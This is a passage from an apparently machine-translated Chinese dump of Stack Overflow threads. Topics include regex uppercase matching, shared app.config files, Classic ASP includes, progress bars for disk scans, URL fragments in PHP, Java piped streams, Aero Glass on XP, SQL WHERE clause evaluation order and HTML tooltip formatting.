说明：正则表达式匹配小写和大写字符之间的位置。CamelCasedWords 是唯一经常发生这种情况的结构。

```
CamelCasedWord
    ^^   ^^           // match occurs between the ^ 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2018-07-05T04:31:16.573

获取大写的索引

短句法

```
Regex.Match("hello,World!", @"(\p{Lu})").Index 
```

结果 6

长示例

使用 System.Text.RegularExpressions；

```
namespace namespace.Helpers
{
    public static class Helper
    {
        public static int IndexOfUppercase(this string str, int startIndex = 0)
        {
            return str.IndexOfRegex(@"(\p{Lu})", startIndex);
        }

        public static int IndexOfRegex(this string str, string regex, int startIndex )
        {
            return str.Substring(startIndex).IndexOfRegex(regex);
        }

        public static int IndexOfRegex(this string str, string regex)
        {
            var match = Regex.Match(str, regex);
            if (match.Success)
            {
                return match.Index;
            }
            return -1;
        }
    }
} 
```

# .net - 如何避免使用 Visual Studio 2008 单元测试重复 app.config？

> ID：484087
> 
> 赞同：3
> 
> 时间：2009-01-27T16:27:27.380
> 
> 标签：.net, visual-studio, visual-studio-2008, unit-testing

当我的主项目中有一个 app.config 时，我总是必须将它复制到它的测试项目中。如何避免？

**更新**我还问[了一个非常相似且稍微复杂的问题](https://stackoverflow.com/questions/484266/how-to-avoid-duplicate-app-config-using-visual-studio-2008-unit-testing-when-usin)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-27T16:29:23.353

从一个地方将其添加为链接。选择其中一个项目作为具有真实 app.config 的项目，并将其链接到其他项目。

添加 -> 现有项目 -> 导航到配置文件 -> 添加为链接（添加按钮中的向下箭头）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T16:39:16.530

您始终可以使用一系列较小的配置文件来设置配置文件，然后使用配置系统中为您提供的各种 configSource 属性将两个应用程序配置文件指向这些较小的文件。这将允许您模块化您的配置，以及创建一个公共位置。

appSettings 将允许您添加一个“文件”属性，该属性将允许您将应用程序设置完全卸载到另一个文件中。

# asp-classic - 我可以替换 ASP（经典）包含中的内容吗？

> ID：484104
> 
> 赞同：0
> 
> 时间：2009-01-27T16:31:43.317
> 
> 标签：asp-classic, vbscript

假设我的应用程序左侧有“默认”内容，该内容包含在标题页中：搜索框和登录框。如果用户在搜索页面上，我还想在页面左侧添加搜索过滤器列表（例如品牌、价格）；在这种情况下，左侧需要访问提供给搜索的参数（例如“黑色皮椅”的关键字搜索）；我在搜索页面上构建了一个相当复杂的查询，我宁愿不必在左侧内容页面上`search.asp`也使用某种巨大的语句来复制它。`If..Then`

有没有办法做到这一点并将附加内容“附加”到页面中已经包含的文件中？基本上类似于 Ruby on Rails 中的 content_for，我可以在此页面上说，将这些内容添加到`<div id="left">`节点中。我不是 Classic ASP 的真正专家（我宁愿不使用它，说实话）但我的老板希望页面左侧的过滤器仅用于搜索页面，以及登录/搜索框（这也出现在所有页面上）我不知道如何处理它而不必重组整个页面。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-27T16:47:07.310

您可以轻松地在左侧使用所需内容设置 div，然后使用客户端 javascript 切换 DIV 的可见性。

您的 javascript 可以检查当前位置，如果它位于希望显示该部分的页面列表中（以防您构建另一个搜索页面），请将可见性切换为 true。

如果您根本不想在左侧呈现 HTML，则可以使用 Javascript 将 HTML 动态写入 DIV。

或者，您可以在搜索页面中设置一个 DIV 并使用 CSS 将其与页面左侧对齐。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T17:00:01.560

在 ASP 中，您可以使用以下命令获取当前路径和文件：

```
pagePath = Request.ServerVariables("PATH_INFO") 
```

您可以拆分字符串，抓住最后一个元素。所以一个select case，根据文件名吐出相应的内容：

```
select case pageName

case "search.asp"
   ...
case "products.asp"
   ...
case else
   ...
end select 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-01-18T06:03:48.500

任何包含都可以使用以前函数中收集的变量。例如，如果您先检索搜索关键字，那么您可以更新稍后出现的任何代码中的值，甚至在包含文件中，因为这些包含毕竟只是包含在整个页面中的更多代码，除了它已包含在插页中，因为它可能对其他页面很常见。

或者您可以运行函数来处理这些变量，例如查找相关结果。

# file - 扫描硬盘时的进度条

> ID：484107
> 
> 赞同：5
> 
> 时间：2009-01-27T16:32:17.543
> 
> 标签：file, progress-bar, directory

所以，我正在做一个简单的扫描来获取硬盘驱动器上所有文件夹的列表（c:\windows 和 c:\windows\system32 被认为是单独的条目）。如果我想为这个 1-2 分钟的任务提供进度条，我该怎么做？也就是说，我知道如何制作进度条，但不确定如何确定完成了多少工作。

编辑：请注意，执行预扫描不是解决方案，因为此扫描仅获取文件夹列表，而预扫描将花费同样长的时间。

代码示例如下。在我的系统上运行干净需要不到 2 分钟，但由于磁盘访问缓存，第二次运行不到 10 秒。我已经创建了基于堆栈而不是基于递归的变体。

我发现一种可能不是 100% 可靠但比我的扫描快得多的机制是将“dir/s/ab/b”通过管道传输到我的程序并计算换行符的实例。Dir 做了某种魔法，比我的程序扫描我的 HD 做得更好，但我不知道那个魔法是什么。

```
class Program
{
    static void recurse(string pos)
    {
        DirectoryInfo f = new DirectoryInfo(pos);
        try
        {
            foreach (DirectoryInfo x in f.GetDirectories("*"))
            {
                recurse(x.FullName);
            }
        } catch (Exception) {}
    }
    static void Main(string[] args)
    {
        recurse("c:\\");
    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-27T18:05:59.883

如果您需要制作进度条，而您无法抽出时间来收集准确的信息，那么您将无法制作出完美的进度条。考虑到这一假设，您仍然可以制作一个并非完全不准确的进度条。

例如，您创建一个函数，根据当前目录中子目录的数量细分进度条。因此，如果您的根目录有 10 个子目录，请将进度条的 10% 分配给每个目录。然后，进入第一个子目录，统计其子目录。如果它有 5 个，则将进度条的前 10% 的 20% 分配给每个进度条（总进度条的 2%）。像这样继续，直到你到达一个没有子目录的目录，在那里进行处理并增加进度条它代表的分数。

进度条上的每个 % 不会代表算法完成的相同数量的工作，但考虑到您的限制，我怀疑您可以做得更好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T16:36:19.703

只是不要使用它。尝试一些更合适的东西，比如旋转动画或 Kitts 风格栏：[http](http://en.wikipedia.org/wiki/KITT) ://en.wikipedia.org/wiki/KITT 。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T16:36:30.310

您可以通过几种方式做到这一点....一个可能不是 100% 准确的简单过程。

在开始之前，获取文件数，然后使用它来计算完成百分比，在处理 X 个文件后更新进度。授予查找的性能成本。也许只是获取根目录的数量，并在您遍历时更新进度。

另一种选择可能是简单地记录“上次运行”详细信息的计数，并使用它来计算百分比，同样，不一定 100% 准确，而是一个选项。

我想我想到的其他一些事情是简单地向用户显示“正在进行”对话框，甚至不尝试获得百分比。否则，可能只显示当前工作目录，表明您正在取得进展。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-28T14:54:05.103

我尝试抓取“ `dir/ad/b/s c:/`”的标准输出并计算行数。这是相当快的。它对于在进度条中使用来说足够值得信赖，但对于用作目录列表来说不够值得信赖。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-27T16:59:57.270

如果您无法递归目录结构，因为这将花费一开始执行任务的时间，那么您能做的最好的事情就是猜测有多少文件夹。严重地。

也许您可以使用基于过去历史的算法（例如，我上次这样做时总共有 150 个目录，当时有 10 个顶级目录，因此一个好的猜测是当前顶级目录数量的 15 倍） .

另一种告诉用户某事需要一段时间（不知道确切的时间）的方法是使用倒数计时器。即使您已经猜到某件事会比实际花费更长的时间（比如说 5 分钟，而实际上是 3 分钟的任务），至少用户知道大概需要多长时间。当它完成得比他们被告知的要快时，他们会更快乐。当然，唯一的遗憾是，如果您在另一边猜错了，即如果某事花费的时间比您想象的要长。然后他们坐在那里等待完成（在他们看来）应该已经完成​​的事情。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-27T17:23:23.260

您可以创建具有递增最大值和值属性的进度条。如果您的 Maximum 属性最初设置为 100，则在 Timer's Tick 事件中，将您的最大值和值都增加 1，例如，您将获得下面列出的值...

```
 Maximum    Value 
Tick1:    101          1   - 1% 
Tick2:    102          2   - 2%
Tick3:    103          3   - 3% 
TickN:    100+n        n 
Finish    100+n      100+n - 100%  --> force to fill the progress bar 
```

您可以对初始最大值进行试验，以使进度条移动得更顺畅。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2010-12-28T04:20:42.370

我使用了 Catchwa 的方法。我将进度范围设置为 14000，因为我系统上的操作系统有那么多目录。当我找到一个空目录时，我将分数加权量添加到进度条。数量基于深度并随范围标准化。在每次子树遍历中，您最终都会得到一个空目录，并且目录中所有空子目录的权重构成该目录的权重，但会分成块。当我找到一个非空目录时，我将子目录的数量存储在地图中。我得到了，使用Qt：

```
emit findProgressBar_setRange(14000); ... if (dir.size()) { m_dirsAtDepth[++m_depth] = dir.size(); } else { qreal product = 1.00; for (int i = 1; i <= m_depth; ++i) { product *= m_dirsAtDepth[i]; } int x = qRound((1.00 / product) * 14000); emit findProgressBar_addValue(x); } 
```

它运行起来非常流畅，而且价格便宜。我还为用户提供了一个准确的进度条选项，我首先计算目录的总数，这可能很昂贵。

# php - 是否可以通过 PHP 访问查询字符串中的锚点？

> ID：484113
> 
> 赞同：4
> 
> 时间：2009-01-27T16:34:21.207
> 
> 标签：php, url, query-string, anchor

我有一个通过这样的 URL 访问的页面：

[http://power-coder.net/Test/something.php?id=3#Page1](http://power-coder.net/Test/something.php?id=3#Page1)

我知道如何使用 $_GET 访问 id 参数，但是有没有办法让我访问 #Page1 部分​​？我查看了 $_SERVER 数组，REQUEST_URI 以 ?id=3 结尾。

我知道我也可以将#Page1 更改为像&Page=1 这样的附加参数，但是有相当多的代码使用旧的URL 类型，我希望尽可能避免重写。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-27T16:37:23.837

不，没有办法。片段部分（# 后的标签）不传输到服务器。

浏览器检索文档[http://power-coder.net/Test/something.php?id=3](http://power-coder.net/Test/something.php?id=3)然后转到文档中正确的锚点（如果有的话）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-27T16:59:34.977

[规范](http://www.faqs.org/rfcs/rfc2396.html)中的相关文本：

> 4.1。片段标识符
> 
> 当使用 URI 引用对已识别的资源执行检索操作时，可选的片段标识符（由交叉线（“#”）字符与 URI 分隔）包含在检索后由用户代理解释的附加参考信息动作已成功完成。因此，它不是 URI 的一部分，但通常与 URI 结合使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-05T03:06:42.063

以防有人仍在寻找解决方案。

只需在锚标记前加上“&”：

[http://example.com/Test/something.php?id=3&#Page1](http://example.com/Test/something.php?id=3&#Page1)

在 Chrome、Firefox、Safari 和 IE11 上测试

# java - 为什么没有更多的 Java 代码使用 PipedInputStream / PipedOutputStream？

> ID：484119
> 
> 赞同：62
> 
> 时间：2009-01-27T16:35:43.120
> 
> 标签：java, design-patterns, concurrency, pipe

我最近发现了这个成语，我想知道我是否缺少一些东西。我从未见过它使用过。我在野外使用过的几乎所有 Java 代码都倾向于将数据放入字符串或缓冲区中，而不是像这个例子那样（例如使用 HttpClient 和 XML API）：

```
 final LSOutput output; // XML stuff initialized elsewhere
    final LSSerializer serializer;
    final Document doc;
    // ...
    PostMethod post; // HttpClient post request
    final PipedOutputStream source = new PipedOutputStream();
    PipedInputStream sink = new PipedInputStream(source);
    // ...
    executor.execute(new Runnable() {
            public void run() {
                output.setByteStream(source);
                serializer.write(doc, output);
                try {
                    source.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }});

    post.setRequestEntity(new InputStreamRequestEntity(sink));
    int status = httpClient.executeMethod(post); 
```

该代码使用 Unix 管道样式技术来防止将 XML 数据的多个副本保存在内存中。它使用 HTTP Post 输出流和 DOM 加载/保存 API 将 XML 文档序列化为 HTTP 请求的内容。据我所知，它通过很少的额外代码（仅用于`Runnable`、`PipedInputStream`和的几行`PipedOutputStream`）最大限度地减少了内存的使用。

那么，这个成语有什么问题呢？如果这个成语没有错，为什么我没看到呢？

编辑：澄清`PipedInputStream`并`PipedOutputStream`替换随处可见的样板缓冲区副本，它们还允许您同时处理传入数据并写出处理后的数据。他们不使用操作系统管道。

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2009-01-27T17:06:17.367

从[Javadocs](http://docs.oracle.com/javase/7/docs/api/java/io/PipedInputStream.html)：

> 通常，数据由一个线程从 PipedInputStream 对象读取，数据由其他线程写入相应的 PipedOutputStream。不建议尝试从单个线程中使用这两个对象，因为它可能会使线程死锁。

这可以部分解释为什么它不被更常用。

我认为另一个原因是许多开发人员不了解它的目的/好处。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-27T16:48:13.503

在您的示例中，您正在创建两个线程来完成可以由一个线程完成的工作。并在混合中引入 I/O 延迟。

你有更好的例子吗？还是我刚刚回答了你的问题。

* * *

将一些评论（至少我对它们的看法）拉到主要回复中：

*   并发将复杂性引入应用程序。您现在必须关注独立数据流的排序，而不是处理单个线性数据流。在某些情况下，增加的复杂性可能是合理的，特别是如果您可以利用多个内核/CPU 来执行 CPU 密集型工作。
*   如果您处于可以从并发操作中受益的情况，通常有更好的方法来协调线程之间的数据流。例如，使用并发队列在线程之间传递对象，而不是将管道流包装在对象流中。
*   当您有多个线程执行文本处理时，管道流可能是一个很好的解决方案，例如 Unix 管道（例如：grep | sort）。

* * *

在特定示例中，管道流允许使用 HttpClient 提供的现有 RequestEntity 实现类。我认为更好的解决方案是创建一个新的实现类，如下所示，因为该示例最终是一个顺序操作，无法从并发实现的复杂性和开销中受益。虽然我将 RequestEntity 显示为匿名类，但可重用性表明它应该是一流的类。

```
post.setRequestEntity(new RequestEntity()
{
    public long getContentLength()
    {
        return 0-1;
    }

    public String getContentType()
    {
        return "text/xml";
    }

    public boolean isRepeatable()
    {
        return false;
    }

    public void writeRequest(OutputStream out) throws IOException
    {
        output.setByteStream(out);
        serializer.write(doc, output);
    }
}); 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-01-27T17:48:44.923

我也是最近才发现 PipedInputStream/PipedOutputStream 类。

我正在开发一个需要通过 SSH 在远程服务器上执行命令的 Eclipse 插件。我正在使用[JSch](http://www.jcraft.com/jsch)和 Channel API 从输入流读取并写入输出流。但我需要通过输入流提供命令并从输出流中读取响应。这就是 PipedInput/OutputStream 的用武之地。

```
import java.io.PipedInputStream;
import java.io.PipedOutputStream;

import com.jcraft.jsch.Channel;

Channel channel;
PipedInputStream channelInputStream = new PipedInputStream();
PipedOutputStream channelOutputStream = new PipedOutputStream();

channel.setInputStream(new PipedInputStream(this.channelOutputStream));
channel.setOutputStream(new PipedOutputStream(this.channelInputStream));
channel.connect();

// Write to channelInputStream
// Read from channelInputStream

channel.disconnect(); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-27T20:50:59.317

另外，回到最初的例子：不，它也不能完全减少内存使用。构建 DOM 树，完成内存缓冲——虽然这比全字节数组副本要好，但并没有那么好。但是在这种情况下缓冲会更慢；并且还创建了一个额外的线程——您不能在单个线程中使用 PipedInput/OutputStream 对。

有时 PipedXxxStreams 很有用，但它们没有被更多使用的原因是因为它们通常不是正确的解决方案。它们适用于线程间通信，这就是我使用它们的价值所在。只是考虑到 SOA 如何将大多数此类边界推到服务之间而不是线程之间，因此没有那么多用例。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-02-11T01:21:33.197

这是管道有意义的用例：

假设您有一个第三方库，例如 xslt 映射器或加密库，其接口如下：doSomething(inputStream, outputStream)。而且您不想在通过线路发送之前缓冲结果。Apache 和其他客户端不允许直接访问线路输出流。您可以获得的最接近的是在请求实体对象中获取输出流 - 在偏移量处，在写入标头之后。但由于这是在幕后，将输入流和输出流传递给第三方库仍然不够。管道是解决这个问题的好方法。

顺便说一句，我写了一个 Apache 的 HTTP 客户端 API [[PipedApacheClientOutputStream]](https://github.com/robertjchristian/piped-apache-client-outputstream)的反转，它使用 Apache Commons HTTP Client 4.3.4 为 HTTP POST 提供了一个 OutputStream 接口。这是一个管道流可能有意义的示例。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-27T20:27:45.947

我前一段时间尝试使用这些类，但我忘记了细节。但我确实发现他们的实施存在致命缺陷。我不记得它是什么，但我有一个偷偷摸摸的记忆，它可能是一个竞争条件，这意味着它们偶尔会死锁（是的，当然我在单独的线程中使用它们：它们根本不能用于单线程，并没有被设计成）。

我可能会看看他们的源代码，看看我是否能看到问题所在。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-10-19T12:28:00.357

java.io 管道有太多的上下文切换（每字节读/写），它们的 java.nio 对应物要求你有一些 NIO 背景和正确使用通道和东西，这是我自己使用阻塞队列的管道实现单个生产者/消费者将执行快速且扩展良好：

```
import java.io.IOException;
import java.io.OutputStream;
import java.util.concurrent.*;

public class QueueOutputStream extends OutputStream
{
  private static final int DEFAULT_BUFFER_SIZE=1024;
  private static final byte[] END_SIGNAL=new byte[]{};

  private final BlockingQueue<byte[]> queue=new LinkedBlockingDeque<>();
  private final byte[] buffer;

  private boolean closed=false;
  private int count=0;

  public QueueOutputStream()
  {
    this(DEFAULT_BUFFER_SIZE);
  }

  public QueueOutputStream(final int bufferSize)
  {
    if(bufferSize<=0){
      throw new IllegalArgumentException("Buffer size <= 0");
    }
    this.buffer=new byte[bufferSize];
  }

  private synchronized void flushBuffer()
  {
    if(count>0){
      final byte[] copy=new byte[count];
      System.arraycopy(buffer,0,copy,0,count);
      queue.offer(copy);
      count=0;
    }
  }

  @Override
  public synchronized void write(final int b) throws IOException
  {
    if(closed){
      throw new IllegalStateException("Stream is closed");
    }
    if(count>=buffer.length){
      flushBuffer();
    }
    buffer[count++]=(byte)b;
  }

  @Override
  public synchronized void write(final byte[] b, final int off, final int len) throws IOException
  {
    super.write(b,off,len);
  }

  @Override
  public synchronized void close() throws IOException
  {
    flushBuffer();
    queue.offer(END_SIGNAL);
    closed=true;
  }

  public Future<Void> asyncSendToOutputStream(final ExecutorService executor, final OutputStream outputStream)
  {
    return executor.submit(
            new Callable<Void>()
            {
              @Override
              public Void call() throws Exception
              {
                try{
                  byte[] buffer=queue.take();
                  while(buffer!=END_SIGNAL){
                    outputStream.write(buffer);
                    buffer=queue.take();
                  }
                  outputStream.flush();
                } catch(Exception e){
                  close();
                  throw e;
                } finally{
                  outputStream.close();
                }
                return null;
              }
            }
    );
  } 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-27T20:02:27.183

> 那么，这个成语有什么问题呢？如果这个成语没有错，为什么我没看到呢？
> 
> 编辑：澄清一下，PipedInputStream 和 PipedOutputStream 替换了随处可见的样板缓冲区逐个缓冲区副本，它们还允许您在写出处理后的数据的同时处理传入数据。他们不使用操作系统管道。

您已经说明了它的作用，但没有说明您这样做的原因。

如果您认为这会减少使用的资源（cpu/内存）或提高性能，那么它也不会这样做。但是，它会使您的代码更加复杂。

基本上你有一个解决方案，没有它解决的问题。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-04-10T12:32:28.303

PipedInputStream 和 PipeOutputStream 将在阻塞等待对方读取或写入满或空缓冲区时将其线程休眠**1 秒。**不使用。

# .net - 是否可以在 XP 上实现“航空玻璃”外观？

> ID：484130
> 
> 赞同：1
> 
> 时间：2009-01-27T16:37:37.237
> 
> 标签：.net, wpf, windows-xp, aero

有谁知道在 XP 上启用（不完全相同，但是）Vista 的 Aero Glass 的任何类型的框架？

我需要使用 WPF 开发一个小型桌面应用程序，它在 XP 上具有类似 Vista 的 UI。我并不需要 Aero Glass，像“Windows Live Messenger”这样的用户界面就可以了。有没有办法让它成为现实？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T17:10:11.257

如果您真的是说 Aero **Glass**，那么我认为您不走运。创建此效果所需的硬件加速仅通过 Vista 的新 DWM（桌面窗口管理器）支持，它通过将多个窗口合成到一个渲染层中来工作。

如果您只想要透明和非矩形窗口，那么这在 XP 中绝对可以实现，Windows Live Messenger 可以做到这一点就证明了这一点。看看MSDN 中的[分层窗口](http://msdn.microsoft.com/en-us/library/ms997507.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T17:43:45.590

正如 Stu Mackellar 所写，Windows XP 缺少获得 Aero Glass 效果所需的部分：DWM。一个解决方案是创建自己的“假”玻璃效果。看看[这个](http://blogs.msdn.com/unnir/archive/2006/03/01/541154.aspx)博客（你可以下载代码）。

# sql - 选择“where子句”评估顺序

> ID：484135
> 
> 赞同：29
> 
> 时间：2009-01-27T16:38:33.070
> 
> 标签：sql, sql-server, sql-server-2005, performance, select

在 Sql Server 2005 中，当我有多个参数时，我能保证评估顺序**总是**从左到右吗？

使用示例：

> `select a from table where c=1 and d=2`

在此查询中，如果“c=1”条件失败，则永远不会评估“d=2”条件？

PS-“c”是一个整数索引列，d 是一个大型 varchar 且不可索引的列，需要全表扫描

**更新**我试图避免执行两个查询或条件语句，我只需要类似的东西：如果“c 条件”失败，有一种方法可以避免执行繁重的“d 条件”，因为在我的情况下不需要它。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2009-01-27T16:43:50.407

无法保证评估顺序。优化器将尝试使用可用信息找到执行查询的最有效方式。

在您的情况下，由于 c 已编入索引而 d 未编入索引，因此优化器应查看索引以查找与 c 上的谓词匹配的所有行，然后从表数据中检索这些行以评估 d 上的谓词。

但是，如果它确定 c 上的索引不是很有选择性（尽管在您的示例中不是，gender 列很少被有用索引），它可能决定无论如何都要进行表扫描。

要确定执行顺序，您应该获得查询的解释计划。但是，请意识到该计划可能会根据优化器认为的最佳查询而改变。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-27T16:41:42.983

SQL Server 将为它执行的每条语句生成一个优化的计划。您无需订购 where 子句即可获得该好处。您唯一的保证是它将按顺序运行语句：

```
SELECT A FROM B WHERE C
SELECT D FROM E WHERE F 
```

将在第二行之前运行第一行。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-27T16:51:57.473

控制评估顺序的一种方法是使用 CASE 表达式。

[编辑]

我试图表达的流行观点是：

> 您不能依赖表达式评估顺序来处理诸如“WHERE OR”之类的事情，因为优化器可能会选择一个在第一个谓词之前评估第二个谓词的计划。但是 CASE 语句中表达式的求值顺序是固定的，因此您可以依赖 CASE 语句的确定性短路求值。

它确实比下面网站中解释的要复杂一些：

[http://blogs.msdn.com/b/bartd/archive/2011/03/03/don-t-depend-on-expression-short-circuiting-in-t-sql-not-even-with-case。 aspx](http://blogs.msdn.com/b/bartd/archive/2011/03/03/don-t-depend-on-expression-short-circuiting-in-t-sql-not-even-with-case.aspx)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-27T16:43:23.200

您可以查看查询的执行计划并确定它实际尝试执行的操作。我认为 SQL Server 的查询引擎应该进行这种类型的扫描，并将其智能地转换为操作。就像，如果你做“昂贵的操作和假”，它会很快评估为假。

根据我了解到的情况，您输入的内容（并且可能）与实际执行的内容不同。你只是告诉服务器你期望什么类型的结果。它如何获得答案与您提供的代码的从左到右无关。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-27T16:52:16.520

如果您想确保可以检查[Query Execution Plan](http://www.sql-server-performance.com/tips/query_execution_plan_analysis_p1.aspx)。MSSQL 构建/优化的执行计划足够聪明，可以在 varchar 列之前检查索引列。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-11-04T06:46:38.803

当我们引用的条件仅包含文字或常量时，就会完成短路。因此，例如，假设我们有一个表 TableA，其中 num 列包含从 1 到 10 的所有正数，然后如果我编写此查询。

从 TableA 中选择 num，其中 TableA.num < 0 AND 1/0 = 10。

这将导致错误。

编译器是否足够聪明，可以确定我的第二个子句由常量组成，因此它应该在评估需要从表或索引进行任何扫描的子句之前评估它？

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-27T16:53:11.043

MS SQL Server 查询优化器确实短路了，是的。保证。

运行这个：

```
select 1 where 1 = 0 and 1 / 0 = 10 
```

即使你被零除，它也会运行得很好并且不会出错，因为查询优化器会短路评估 where 子句。这对您使用“and”并且其中一个和部分是常量的任何 where 子句都有影响。

# html - 是否可以格式化 HTML 工具提示（标题属性）？

> ID：484137
> 
> 赞同：88
> 
> 时间：2009-01-27T16:39:01.710
> 
> 标签：html, tooltip

是否可以格式化 HTML 工具提示？

例如，我有一个属性为 title="foo!" 的 DIV。当我放大或缩小浏览器的文本大小时，工具提示的文本大小保持不变。有没有办法通过浏览器设置使工具提示字体缩放？

* * *

## 回答 #1

> 赞同：91
> 
> 时间：2012-09-18T23:09:12.713

尝试使用实体代码，例如`&#013;`CR、`&#010;`LF 和`&#009;`TAB。

例如：

```
<div title="1)&#009;A&#013;&#010;2)&#009;B">Hover Me</div>
```

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2009-01-27T16:40:11.757

不，但是还有其他选项，例如[Overlib](https://github.com/overlib/overlib)和[jQuery](http://www.jquery.com)，可以让您获得这种自由。

*   jtip： http: [//www.codylindley.com/blogstuff/js/jtip/](http://www.codylindley.com/blogstuff/js/jtip/)
*   jQuery 工具提示：[https ://jqueryui.com/tooltip/](https://jqueryui.com/tooltip/)

就个人而言，我建议使用 jQuery 作为路线。它通常非常不引人注目，并且不需要在您的站点标记中进行额外设置（除了在 <head> 中添加 jquery 脚本标记）。

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2010-09-22T10:29:31.613

看来您可以使用 css 和一个技巧（没有 javascript）来做到这一点：

[http://davidwalsh.name/css-tooltips](http://davidwalsh.name/css-tooltips)

[http://www.menucool.com/tooltip/css-tooltip](http://www.menucool.com/tooltip/css-tooltip)

[http://sixrevisions.com/css/css-only-tooltips/](http://sixrevisions.com/css/css-only-tooltips/)

[http://csstooltip.com](http://csstooltip.com)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2014-10-27T15:07:16.773

他们总是说，迟到总比没有好。

通常我会使用 jQuery 来解决这种情况。但是，在为需要无 javascript 解决方案的客户端工作时，我想出了以下内容：

```
<div class="hover-container">
    <div class="hover-content">
        <p>Content with<br />
        normal formatting</p>
    </div>
</div> 
```

通过使用以下 css，您会得到与标题相同的情况：

```
.hover-container {
    position: relative;
}

.hover-content {
    position: absolute;
    bottom: -10px;
    right: 10px;
    display: none;
}

.hover-container:hover .hover-content {
    display: block;
} 
```

这也使您可以选择根据需要对其进行样式设置，并且它适用于所有浏览器。即使是禁用 javascript 的那些。

## 优点：

*   你对造型有很大影响
*   它适用于（几乎）所有浏览器

## 缺点：

*   定位工具提示更难

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2018-01-12T16:46:49.763

在引导工具提示中，只需使用 data-html="true"

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-01-27T17:04:12.220

不，这是不可能的，浏览器有自己的方式来实现工具提示。您所能做的就是使用 Javascript 创建一些行为类似于 HTML 工具提示的 div（主要是“悬停时显示”），然后按照您想要的方式对其进行样式设置。

有了这个，您不必担心浏览器的放大或缩小，因为工具提示 div 内的文本是实际的 HTML，它会相应地缩放。

有关一些好的资源，请参阅 Jonathan 的[帖子](https://stackoverflow.com/questions/484137/is-it-possible-to-format-an-html-tooltip#484144)。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-06-29T01:46:59.937

不确定它是否适用于所有浏览器或第 3 方工具，但我已经成功地在工具提示中为换行符指定“\n”，至少在 ie11、firefox 和 chrome 中适用于 dhtmlx

```
for (var key in oPendingData) {
    var obj = oPendingData[key];
    this.cells(sRowID, nColInd).cell.title += "\n" + obj["ChangeUser"] + ": " + obj[sCol];
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-27T17:01:26.610

[Mootools](http://mootools.net)的“更多构建器”中还有一个不错的“提示”类。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-09-21T18:05:13.433

我知道这是一篇旧帖子，但我想添加我的答案以供将来参考。我使用 jQuery 和 css 来设置我的工具提示样式：easy-tooltip-and-image-preview-using-jquery（用于演示：[http](http://cssglobe.com/lab/tooltip/02/) ://cssglobe.com/lab/tooltip/02/ ）伟大的。但是，在迁移到 Wordpress 期间它停止了。我的解决方案是将标签更改`<br> and <span>`为：`&lt;br&gt; and &lt;span&gt;` 这对我有用。

# c++ - 如何使具有 HTML 视图的 MFC 应用程序始终接受拖放文件？

> ID：484142
> 
> 赞同：1
> 
> 时间：2009-01-27T16:39:27.357
> 
> 标签：c++, mfc

当文件被拖到客户区时，我试图破译 CHtmlView 的行为，所以我创建了一个新的 MFC 应用程序并注释掉了启动时导航到 MSDN 的 CHtmlView 行。在我的主框架中，我用一个显示消息框的函数覆盖了 CWnd::OnDropFiles()，以查看何时发送 WM_DROPFILES。

OnDropFiles() 会在您第一次尝试将文件拖入应用程序时触发。独特的是，应用程序似乎将第一次解释为显示文件中数据的请求，而不是打开文件的请求。我已经尝试从视图类中覆盖 OnDrop() ，但它从未被调用过。

为什么第一次不一样？如何捕获所有将文件拖入我的应用程序的尝试？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-30T13:10:34.433

这是底层`WebBrowser`控制行为的一部分。`CHtmlView`默认设置`RegisterAsDropTarget`为`true`，表示控件拦截drop操作并执行自己的处理。

如果您想禁止它，请调用`SetRegisterAsDropTarget(FALSE)`您的`OnInitialUpdate`实现。然后，所有放置操作都将与主窗口交互。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-30T02:05:49.797

前言：我是从我找到的文档中推断出来的，如果我错了，我也不担心。请确保以下解释有意义，即尝试一下，然后再投票或接受我的答案:)

